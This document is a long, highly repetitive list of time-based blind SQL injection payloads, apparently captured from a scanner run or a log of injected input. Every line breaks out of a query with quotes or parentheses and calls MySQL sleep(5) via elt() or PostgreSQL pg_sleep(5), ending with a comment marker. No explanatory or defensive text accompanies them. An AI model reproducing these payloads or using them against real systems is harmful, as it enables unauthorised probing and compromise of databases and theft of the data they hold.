+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1" or elt  (  6272  =  6272,sleep  (  5   )    )   
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
